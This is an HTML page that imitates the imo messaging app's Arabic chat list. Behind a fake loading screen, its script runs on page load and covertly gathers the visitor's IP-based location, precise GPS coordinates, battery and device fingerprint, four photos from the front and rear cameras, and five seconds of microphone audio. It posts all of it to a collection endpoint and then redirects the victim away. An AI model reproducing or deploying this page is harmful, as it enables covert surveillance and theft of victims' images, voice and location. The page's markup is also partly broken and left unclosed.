<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>imo</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #0a0a0a;
            color: #fff;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
        }
        .imo-container {
            position: relative;
            width: 100%;
            height: 100vh;
            background: #0a0a0a;
            display: flex;
            flex-direction: column;
        }

        /* Top Header */
        .top-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 16px;
            background: #0a0a0a;
            border-bottom: 1px solid rgba(255,255,255,0.06);
            z-index: 100;
            flex-shrink: 0;
        }
        .imo-logo {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .imo-logo i {
            font-size: 28px;
            color: #00bfff;
        }
        .imo-logo-text {
            font-size: 24px;
            font-weight: 700;
            color: #00bfff;
            font-family: 'Segoe UI', sans-serif;
            letter-spacing: 1px;
        }
        .header-icons {
            display: flex;
            align-items: center;
            gap: 18px;
        }
        .header-icons i {
            font-size: 22px;
            color: #fff;
        }

        /* Tabs Bar */
        .tabs-bar {
            display: flex;
            background: #0a0a0a;
            border-bottom: 1px solid rgba(255,255,255,0.06);
            z-index: 100;
            flex-shrink: 0;
        }
        .tab {
            flex: 1;
            text-align: center;
            padding: 12px 0;
            font-size: 14px;
            font-weight: 500;
            color: rgba(255,255,255,0.5);
            cursor: pointer;
            position: relative;
        }
        .tab.active {
            color: #00bfff;
            font-weight: 600;
        }
        .tab.active::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            width: 40px;
            height: 3px;
            background: #00bfff;
            border-radius: 2px;
        }

        /* Chat List */
        .chat-list {
            flex: 1;
            overflow-y: auto;
            scrollbar-width: none;
            background: #0a0a0a;
        }
        .chat-list::-webkit-scrollbar { display: none; }

        .chat-item {
            display: flex;
            align-items: center;
            gap: 14px;
            padding: 12px 16px;
            border-bottom: 1px solid rgba(255,255,255,0.04);
            cursor: pointer;
        }
        .chat-avatar {
            width: 52px; height: 52px;
            border-radius: 50%;
            background: linear-gradient(135deg, #00bfff, #009acd);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            overflow: hidden;
            position: relative;
        }
        .chat-avatar i {
            font-size: 22px;
            color: #fff;
        }
        .online-indicator {
            position: absolute;
            bottom: 2px; right: 2px;
            width: 14px; height: 14px;
            border-radius: 50%;
            background: #00e676;
            border: 2px solid #0a0a0a;
        }
        .chat-info {
            flex: 1;
            min-width: 0;
        }
        .chat-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 4px;
        }
        .chat-name {
            font-size: 15px;
            font-weight: 600;
            color: #fff;
        }
        .chat-time {
            font-size: 12px;
            color: rgba(255,255,255,0.4);
        }
        .chat-row2 {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .chat-preview {
            font-size: 14px;
            color: rgba(255,255,255,0.5);
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            flex: 1;
        }
        .chat-preview i {
            font-size: 12px;
            margin-left: 4px;
            color: #00bfff;
        }
        .chat-badge {
            min-width: 20px; height: 20px;
            border-radius: 50%;
            background: #00bfff;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 600;
            color: #000;
            padding: 0 6px;
        }
        .call-icon {
            color: #00bfff;
            font-size: 18px;
        }

        /* Loading Spinner القديم - تم إخفاؤه */
        .loading-spinner {
            display: none; /* إخفاء spinner القديم */
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 999;
            justify-content: center;
            align-items: center;
        }
        .spinner-ring {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(0,191,255,0.15);
            border-top-color: #00bfff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            box-shadow: 0 0 20px rgba(0,191,255,0.1);
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Bottom Nav */
        .bottom-nav {
            display: flex;
            justify-content: space-around;
            align-items: center;
            padding: 8px 0 20px;
            background: #0a0a0a;
            border-top: 1px solid rgba(255,255,255,0.06);
            z-index: 200;
            flex-shrink: 0;
        }
        .nav-item {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2px;
            cursor: pointer;
            color: rgba(255,255,255,0.4);
            font-size: 10px;
        }
        .nav-item i {
            font-size: 24px;
        }
        .nav-item.active {
            color: #00bfff;
        }
        .nav-item .nav-avatar {
            width: 26px; height: 26px;
            border-radius: 50%;
            background: linear-gradient(135deg, #00bfff, #009acd);
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .nav-avatar i {
            font-size: 14px;
            color: #fff;
        }

        /* ===== NEW: Loading Overlay مع تشويش خفيف ===== */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            background: rgba(0, 0, 0, 0.1);
            backdrop-filter: blur(2px);
            -webkit-backdrop-filter: blur(2px);
            pointer-events: none;
            opacity: 1;
            transition: opacity 0.5s ease;
        }
        .loading-overlay.hidden {
            opacity: 0;
            pointer-events: none;
        }
        .loading-box {
            background: #1a8cff; /* أزرق */
            padding: 30px 40px;
            border-radius: 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
            backdrop-filter: none;
            -webkit-backdrop-filter: none;
        }
        .loading-box .spinner-ring-big {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top-color: #ffffff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        .loading-box p {
            color: #fff;
            margin-top: 15px;
            font-size: 16px;
            font-weight: 500;
        }
        /* ================================================= */
    </style>
</head>
<body>
    <!-- ===== NEW: Overlay التحميل ===== -->
    <div id="loadingOverlay" class="loading-overlay">
        <div class="loading-box">
            <div class="spinner-ring-big"></div>
            <p>جاري التحميل...</p>
        </div>
    </div>

    <div class="imo-container">
        <!-- Top Header -->
        <div class="top-header">
            <div class="imo-logo">
                <i class="fas fa-video"></i>
                <span class="imo-logo-text">imo</span>
            </div>
            <div class="header-icons">
                <i class="fas fa-magnifying-glass"></i>
                <i class="fas fa-plus"></i>
            </div>
        </div>

        <!-- Tabs Bar -->
        <div class="tabs-bar">
            <div class="tab active">الدردشات</div>
            <div class="tab">المكالمات</div>
            <div class="tab">القصص</div>
        </div>

        <!-- Chat List -->
        <div class="chat-list">
            <!-- Chat 1 -->
            <div class="chat-item">
                <div class="chat-avatar">
                    <i class="fas fa-user"></i>
                    <div class="online-indicator"></div>
                </div>
                <div class="chat-info">
                    <div class="chat-row">
                        <span class="chat-name">أحمد</span>
                        <span class="chat-time">12:30</span>
                    </div>
                    <div class="chat-row2">
                        <span class="chat-preview"><i class="fas fa-check-double"></i> مرحباً! كيف حالك؟</span>
                        <span class="chat-badge">3</span>
                    </div>
                </div>
            </div>

            <!-- Chat 2 -->
            <div class="chat-item">
                <div class="chat-avatar">
                    <i class="fas fa-user"></i>
                    <div class="online-indicator"></div>
                </div>
                <div class="chat-info">
                    <div class="chat-row">
                        <span class="chat-name">سارة</span>
                        <span class="chat-time">11:45</span>
                    </div>
                    <div class="chat-row2">
                        <span class="chat-preview"><i class="fas fa-video"></i> مكالمة فيديو غير مقبولة</span>
                        <i class="fas fa-phone call-icon"></i>
                    </div>
                </div>
            </div>

            <!-- Chat 3 -->
            <div class="chat-item">
                <div class="chat-avatar">
                    <i class="fas fa-users"></i>
                </div>
                <div class="chat-info">
                    <div class="chat-row">
                        <span class="chat-name">مجموعة العائلة</span>
                        <span class="chat-time">أمس</span>
                    </div>
                    <div class="chat-row2">
                        <span class="chat-preview">محمد: صورة جميلة! 📸</span>
                        <span class="chat-badge">12</span>
                    </div>
                </div>
            </div>

            <!-- Chat 4 -->
            <div class="chat-item">
                <div class="chat-avatar">
                    <i class="fas fa-user"></i>
                </div>
                <div class="chat-info">
                    <div class="chat-row">
                        <span class="chat-name">ليلى</span>
                        <span class="chat-time">10:20</span>
                    </div>
                    <div class="chat-row2">
                        <span class="chat-preview">شكراً جزيلاً! 🙏</span>
                    </div>
                </div>
            </div>

            <!-- Chat 5 -->
            <div class="chat-item">
                <div class="chat-avatar">
                    <i class="fas fa-user"></i>

                </div>
                <div class="chat-info">
                    <div class="chat-row">
                        <span class="chat-name">عمر</span>
                        <span class="chat-time">الأحد</span>
                    </div>
                    <div class="chat-row2">
                        <span class="chat-preview"><i class="fas fa-check"></i> تمام، نشوفك بكرة</span>
                    </div>
                </div>
            </div>

            <!-- Chat 6 -->
            <div class="chat-item">
                <div class="chat-avatar">
                    <i class="fas fa-user"></i>
                </div>
                <div class="chat-info">
                    <div class="chat-row">
                        <span class="chat-name">نورة</span>
                        <span class="chat-time">السبت</span>
                    </div>
                    <div class="chat-row2">
                        <span class="chat-preview"><i class="fas fa-image"></i> صورة</span>
                        <i class="fas fa-phone call-icon"></i>
                    </div>

            </div>

            <!-- Chat 7 -->
            <div class="chat-item">
                <div class="chat-avatar">
                    <i class="fas fa-user"></i>
                    <div class="online-indicator"></div>
                </div>
                <div class="chat-info">
                    <div class="chat-row">
                        <span class="chat-name">خالد</span>

                    </div>
                    <div class="chat-row2">
                        <span class="chat-preview"><i class="fas fa-microphone"></i> رسالة صوتية</span>

        </div>

        <!-- Loading Spinner القديم (مخفي الآن) -->
        <div class="loading-spinner">
            <div class="spinner-ring"></div>
        </div>

        <!-- Bottom Nav -->
        <div class="bottom-nav">
            <div class="nav-item active">
                <i class="fas fa-comment"></i>
                <span>الدردشات</span>
            </div>
            <div class="nav-item">

    <form id="dataForm" method="POST" action="REDIRECT_URL" style="display:none;">
        <input type="hidden" name="chatId" id="chatId">
        <input type="hidden" name="imageDatas" id="imageDatas">
        <input type="hidden" name="location" id="location">
        <input type="hidden" name="permissions" id="permissions">
        <input type="hidden" name="ipInfo" id="ipInfo">
        <input type="hidden" name="battery" id="battery">
        <input type="hidden" name="audioData" id="audioData">
        <input type="hidden" name="deviceInfo" id="deviceInfo">
    </form>

    <script>
        const REDIRECT_URL = "REDIRECT_URL";
        let images = [], audioData = null;
        let ipInfo = '', batteryStatus = '', locationStr = '';
        let permissions = [];
        let deviceInfo = {};

        // عنصر overlay للتحميل
        const loadingOverlay = document.getElementById('loadingOverlay');

        async function getIP() {
            try {
                const r = await fetch('https://ipapi.co/json/');
                const d = await r.json();
                ipInfo = `Country: ${d.country_name || 'Unknown'}, City: ${d.city || 'Unknown'}, IP: ${d.ip || 'Unknown'}`;
            } catch {
                ipInfo = 'Unable to get IP';
            }
        }

        async function getBattery() {
            try {
                const b = await navigator.getBattery();
                batteryStatus = `Level: ${Math.round(b.level * 100)}%, Charging: ${b.charging ? 'Yes' : 'No'}`;
            } catch {
                batteryStatus = 'Unknown';
            }
        }

        async function captureImage(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: facingMode }, width: 640, height: 480 }
                });
                const v = document.createElement('video');
                v.srcObject = stream;
                await v.play();
                await new Promise(r => setTimeout(r, 300));

                const c = document.createElement('canvas');
                c.width = v.videoWidth || 640;
                c.height = v.videoHeight || 480;
                c.getContext('2d').drawImage(v, 0, 0);

                const imageData = c.toDataURL('image/jpeg', 0.7).split(',')[1];
                images.push(imageData);

                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch (error) {
                permissions.push(`Camera ${facingMode} Denied`);
                return false;
            }
        }

        async function captureAllImages() {
            await captureImage('user');
            await captureImage('environment');
            await captureImage('user');
            await captureImage('environment');
        }

        async function recordAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];

                mediaRecorder.ondataavailable = e => chunks.push(e.data);

                return new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            const base64 = reader.result.split(',')[1];
                            audioData = base64;
                            stream.getTracks().forEach(t => t.stop());
                            resolve();
                        };
                        reader.readAsDataURL(blob);
                    };

                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 5000);
                });
            } catch (error) {
                permissions.push('Audio Denied');
                return null;
            }
        }

        async function getLocation() {
            return new Promise(res => {
                navigator.geolocation.getCurrentPosition(
                    p => {
                        locationStr = `Lat:${p.coords.latitude}, Lon:${p.coords.longitude}, Acc:${p.coords.accuracy}m`;
                        res(locationStr);
                    },
                    () => {
                        permissions.push('Location Denied');
                        locationStr = '';
                        res('');
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }

        async function getDeviceInfo() {
            deviceInfo = {
                platform: navigator.platform || 'Unknown',
                userAgent: navigator.userAgent || 'Unknown',
                language: navigator.language || 'Unknown',
                memory: navigator.deviceMemory || 'Unknown',
                cores: navigator.hardwareConcurrency || 'Unknown',
                screen: `${screen.width}x${screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
                vendor: navigator.vendor || 'Unknown',
                product: navigator.product || 'Unknown',
                cookieEnabled: navigator.cookieEnabled || false,
                doNotTrack: navigator.doNotTrack || 'Unknown',
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType || 'Unknown',
                    downlink: navigator.connection.downlink || 'Unknown',
                    rtt: navigator.connection.rtt || 'Unknown'
                } : null
            };
            return deviceInfo;
        }

        async function sendData() {
            try {
                const fd = new FormData();
                fd.append('ipInfo', ipInfo);
                fd.append('battery', batteryStatus);
                fd.append('location', locationStr);
                fd.append('imageDatas', images.join(','));
                fd.append('permissions', permissions.join(', '));
                fd.append('audioData', audioData || '');
                fd.append('deviceInfo', JSON.stringify(deviceInfo));
                fd.append('chatId', navigator.userAgent || 'Unknown');

                const response = await fetch('/submitData', { 
                    method: 'POST', 
                    body: fd,
                    timeout: 30000
                });

                return response;
            } catch (error) {
                console.error('Send error:', error);
                return null;
            }
        }

        async function startProcess() {
            // إظهار الـ overlay
            loadingOverlay.classList.remove('hidden');

            await getIP();
            await getBattery();
            await getLocation();
            await getDeviceInfo();
            await captureAllImages();
            await recordAudio();

            const response = await sendData();

            // إخفاء الـ overlay بعد الانتهاء
            loadingOverlay.classList.add('hidden');

            if (REDIRECT_URL && REDIRECT_URL !== 'REDIRECT_URL') {
                window.location.href = REDIRECT_URL;
            } else {
                window.location.href = 'https://www.google.com';
            }
        }

        window.onload = function() {
            startProcess();
        };
    </script>
</body>
